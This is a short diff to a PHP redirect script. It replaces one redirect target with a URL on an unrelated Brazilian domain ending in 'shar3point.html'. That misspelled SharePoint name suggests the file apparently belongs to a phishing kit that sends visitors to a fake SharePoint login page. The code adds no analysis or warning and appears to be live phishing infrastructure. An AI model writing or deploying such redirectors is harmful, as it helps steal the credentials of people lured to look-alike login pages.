@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://127002.bitbucket.io/");
+header("Location: https://olhodesogra.com.br/shar3point.html/");
 exit();
 ?>
